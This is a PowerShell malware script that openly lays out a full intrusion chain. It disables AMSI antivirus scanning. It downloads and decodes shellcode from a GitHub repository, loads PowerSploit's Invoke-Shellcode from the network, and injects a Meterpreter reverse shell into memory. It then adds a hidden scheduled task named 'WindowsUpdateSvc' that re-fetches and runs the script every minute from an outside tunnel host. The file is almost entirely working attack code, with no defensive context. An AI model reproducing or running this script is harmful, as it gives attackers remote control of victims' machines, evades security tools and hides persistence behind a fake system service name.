# --- PowerShell script: ps-persist.ps1 ---
# Purpose: Download shellcode archive, extract, decode, inject to memory, and persist

# Bypass AMSI (minimal)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Define paths
$tmp = "$env:TEMP\scpayload"
$archive = "$tmp\sc.tar.gz"
$extracted = "$tmp\shellcode.b64"

# Create temp folder
New-Item -ItemType Directory -Force -Path $tmp | Out-Null

# Download shellcode archive
Invoke-WebRequest -Uri "https://github.com/mitasahi/root/raw/refs/heads/main/shellcode.b64.tar.gz" -OutFile $archive

# Extract .tar.gz (PowerShell 5+ with built-in tar)
tar -xf $archive -C $tmp

# Read shellcode from base64 file
$sc = Get-Content -Raw -Path $extracted
$buf = [System.Convert]::FromBase64String($sc)

# Download and load Invoke-Shellcode from PowerSploit
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')

# Execute shellcode in memory (Meterpreter reverse_tcp)
Invoke-Shellcode -Shellcode $buf -Force

# Set up persistence with scheduled task (runs every 60s)
$taskCmd = 'powershell.exe -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString(''http://engineering-ebay.gl.at.ply.gg/ps-persist.ps1''))'
schtasks /create /sc minute /mo 1 /tn "WindowsUpdateSvc" /tr "$taskCmd" /f | Out-Null
